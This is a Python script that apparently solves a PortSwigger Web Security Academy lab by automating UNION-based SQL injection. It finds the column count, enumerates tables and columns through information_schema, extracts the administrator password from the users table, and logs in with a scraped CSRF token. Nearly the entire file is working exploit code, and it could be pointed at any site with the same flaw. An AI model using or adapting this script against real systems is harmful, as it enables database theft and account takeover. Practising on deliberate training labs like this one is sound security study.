import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

apostrophe = "'"
space = " "
union = "UNION"
select = "SELECT"
comment = "--"
where = "WHERE"
comma = ","

def column_number_guesser(session,url) :

    initial_payload = apostrophe + space + union + space + select + space
    payload = "NULL"
      
    while (session.get(url + initial_payload + payload + comment, verify=False).status_code == 500):
        payload += ",NULL"
    
    return payload

def vulnerable_column_determination (session,url,payload):
    
    initial_payload = apostrophe + space + union + space + select + space   
    spots = payload.split(comma)
    trials =[]
    for i in range(len(spots)) :
        
        trial = ""
        trial += comma.join(spots[:i])
        if i == 0 :
            trial += "'a'" + comma
        elif i == len(spots) - 1  :
            trial += comma + "'a'"
        else :
            trial += comma + "'a'" + comma
        
        trial += comma.join(spots[i+1:])
        trials.append(trial)
    
    
    for trial_payload in trials :

        resp = session.get(url + initial_payload + trial_payload + comment, verify=False)
        
        if not "Internal Server Error" in resp.text :
            return  trial_payload
    
    return None

def all_tables(url,session,payload) :

    payload = payload.replace("'a'","table_name")
    tables_payload = apostrophe + space + union + space + select + space + payload + space + "FROM" + space + "information_schema.tables" + comment

    response = session.get(url + tables_payload, verify=False)
    if response.status_code == 200 :
        soup = BeautifulSoup(response.text, "html.parser")
        all_th_tags = soup.find_all('th')
        tables = []
        
        for th in all_th_tags :
            parent_row = th.find_parent('tr')
            if parent_row :
                if len(parent_row.find_all('td')) == 0 :
                    tables.append(th.get_text(strip=True))
        
        return tables
    return None

def finding_right_table_and_column_names(url,session,payload,tables) :
   
    payload = payload.replace("'a'","column_name")
    
    for table in tables :
        tables_payload = apostrophe + space + union + space + select + space + payload + space + "FROM" + space + \
            "information_schema.columns" + space + where + space + f'table_name={apostrophe}{table}{apostrophe}' + comment
        
        response = session.get(url + tables_payload, verify=False)
        if response.status_code == 200 :
            
            soup = BeautifulSoup(response.text, "html.parser")
            if "username" in soup.get_text() and "password" in soup.get_text() :
                columns = []
                all_th_tags = soup.find_all('th')
                for th in all_th_tags :
                    
                    parent_row = th.find_parent('tr')
                    
                    if parent_row and ("username" in th.get_text(strip=True) or "password" in th.get_text(strip=True)):
                        if len(parent_row.find_all('td')) == 0 :
                            columns.append(th.get_text(strip=True))
                sorted(columns)            
                
                return [table,columns]
            
    return None

def getting_creds (url,session,table,columns) :

    column_1 = columns[1]
    column_2 = columns[0]
    payload = apostrophe + space + union + space + select + space + column_1 + comma + space \
    + column_2 + space + "FROM" + space + table + comment

    response = session.get(url + payload, verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    admin_th = soup.find('th', string="administrator")
    if admin_th:   
        password = admin_th.find_next_sibling('td').get_text()
        print(f"Koated !!! administrator password is: {password}")
        return password
    else:
        print("Failed to find administrator credentials.")
    
    return None

def check_wrong_login(text):
    soup = BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else:
        error = None
    if error == "Invalid username or password.":
        return False
    return True


def csrf_getter(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]

def main():
    base_url = "https://0a2700ca03341be58093124c006900f6.web-security-academy.net"
    product_url = f'{base_url}/filter?category=Gifts'

    session = requests.Session()

    number_of_columns_payload = column_number_guesser(session,product_url)
    
    type_detect_payload = vulnerable_column_determination(session,product_url,number_of_columns_payload)

    tables = all_tables(product_url,session,type_detect_payload)

    table_and_columns = finding_right_table_and_column_names(product_url,session,type_detect_payload,tables)

    password = getting_creds(product_url,session,table_and_columns[0],table_and_columns[1])

    login_url = f'{base_url}/login'
    
    csrf = csrf_getter(session, login_url)
    creds = {"csrf": csrf, "username": "administrator", "password": password}
    r = session.post(login_url, data=creds, verify=False)
    
    if check_wrong_login(r.text):
        print("Koated !!")
    else:
        print("ya siks")

if __name__ == "__main__":
    main()




    
    






    


                    
            


    

        



    
